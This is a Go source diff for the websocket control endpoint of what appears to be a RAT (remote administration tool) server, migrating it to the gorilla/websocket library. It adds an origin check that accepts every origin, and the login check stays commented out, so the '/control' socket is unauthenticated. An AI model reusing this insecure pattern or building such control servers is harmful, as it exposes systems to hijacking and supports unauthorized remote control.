@@ -1,12 +1,14 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
 	"net/http"
 	"rat/command/log"
 	"reflect"
+	"sync"
 
-	"golang.org/x/net/websocket"
+	"github.com/gorilla/websocket"
 	"gopkg.in/mgo.v2/bson"
 )
 
@@ -28,8 +30,9 @@ func (e *EventListener) Unlisten() {
 }
 
 type Controller struct {
-	ws  *websocket.Conn
-	die chan struct{}
+	ws    *websocket.Conn
+	die   chan struct{}
+	mutex *sync.Mutex
 
 	Listeners map[*EventListener]bool
 }
@@ -38,6 +41,7 @@ func NewController(ws *websocket.Conn) *Controller {
 	return &Controller{
 		ws:        ws,
 		die:       make(chan struct{}),
+		mutex:     &sync.Mutex{},
 		Listeners: make(map[*EventListener]bool),
 	}
 }
@@ -89,7 +93,12 @@ func sendMessage(controller *Controller, c *Client, message OutgoingMessage) err
 	}
 
 	b, err := bson.Marshal(asdf)
-	err = websocket.Message.Send(controller.ws, b)
+	if err != nil {
+		return err
+	}
+	controller.mutex.Lock()
+	err = controller.ws.WriteMessage(websocket.BinaryMessage, b)
+	controller.mutex.Unlock()
 	return err
 }
 
@@ -121,7 +130,7 @@ func incomingWebSocket(ws *websocket.Conn) {
 	defer close()
 
 	disconnect := func(reason interface{}) {
-		log.Ferror("%s: %s", ws.Request().RemoteAddr, reason)
+		log.Ferror("%s: %s", ws.RemoteAddr(), reason)
 	}
 	/*
 		var auth LoginMessage
@@ -144,7 +153,7 @@ func incomingWebSocket(ws *websocket.Conn) {
 			return
 		} */
 
-	log.Fgreen("%s: connected\n", ws.Request().RemoteAddr)
+	log.Fgreen("%s: connected\n", ws.RemoteAddr())
 
 	/* 	if len(DisplayTransfers) > 0 {
 		sendMessage(ws, nil, DisplayTransferMessage{
@@ -156,7 +165,7 @@ func incomingWebSocket(ws *websocket.Conn) {
 
 	for {
 		var bbb []byte
-		err := websocket.Message.Receive(ws, &bbb)
+		_, bbb, err := ws.ReadMessage()
 		var event Event
 		bson.Unmarshal(bbb, &event)
 
@@ -170,7 +179,8 @@ func incomingWebSocket(ws *websocket.Conn) {
 		if handler, ok := Messages[MessageHeader(event.Event)]; ok {
 			i := reflect.New(reflect.TypeOf(handler)).Interface()
 
-			err = websocket.JSON.Receive(ws, &i)
+			_, message, err := ws.ReadMessage()
+			json.Unmarshal(message, &i)
 			if err != nil {
 				disconnect(err)
 				return
@@ -197,7 +207,21 @@ func incomingWebSocket(ws *websocket.Conn) {
 	}
 }
 
-/// InitControlSocket starts listening for incoming websocket connections
+func checkOrigin(*http.Request) bool {
+	return true
+}
+
+// InitControlSocket starts listening for incoming websocket connections
 func InitControlSocket() {
-	http.Handle("/control", websocket.Handler(incomingWebSocket))
+	upgrader := websocket.Upgrader{
+		CheckOrigin: checkOrigin,
+	}
+	http.HandleFunc("/control", func(w http.ResponseWriter, r *http.Request) {
+		c, err := upgrader.Upgrade(w, r, nil)
+		if err != nil {
+			fmt.Println("websocket failed", err)
+			return
+		}
+		incomingWebSocket(c)
+	})
 }
